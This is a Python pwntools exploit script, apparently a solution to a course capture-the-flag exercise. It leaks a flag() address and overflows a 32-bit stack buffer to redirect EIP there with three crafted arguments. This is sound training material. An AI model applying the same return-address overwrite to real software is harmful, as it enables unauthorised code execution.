#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 10)
EXE_FILENAME = '../pwn_student_binaries/call_me_Federico-Conti'
argv = [EXE_FILENAME]
envp = {}

# thanks Ghidra 
param1 = -0x35aa1882
param2 =  0x5ca1ab1e
param3 = -0x45a145ef

param1_u = param1 & 0xffffffff
param2_u = param2 & 0xffffffff
param3_u = param3 & 0xffffffff

OFFSET_EIP = 192  # thanks pwn cyclic :)

def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE_FILENAME)

io = start()

lyrics = [
    b"Color me your color, baby",
    b"Color me your car",
    b"Color me your color, darling",
]

for idx, line in enumerate(lyrics, 1):
    io.sendlineafter(f"Enter line #{idx}:".encode(), line)

# &target= 0xflag()Address
data = io.recvuntil(b"Enter line #4:")
text = data.decode(errors="ignore")

match = re.search(r"0x[0-9a-fA-F]+", text)
if not match:
    log.failure("No address found in output")
    io.close()
    exit(1)

target_addr = int(match.group(0), 16)
log.success(f"Leak Target: {hex(target_addr)}")

payload  = b"A" * OFFSET_EIP
payload += p32(target_addr)      # EIP = flag()
payload += b"fake" 
payload += p32(param1_u)    
payload += p32(param2_u)    
payload += p32(param3_u)  

io.sendline(payload)

io.interactive()
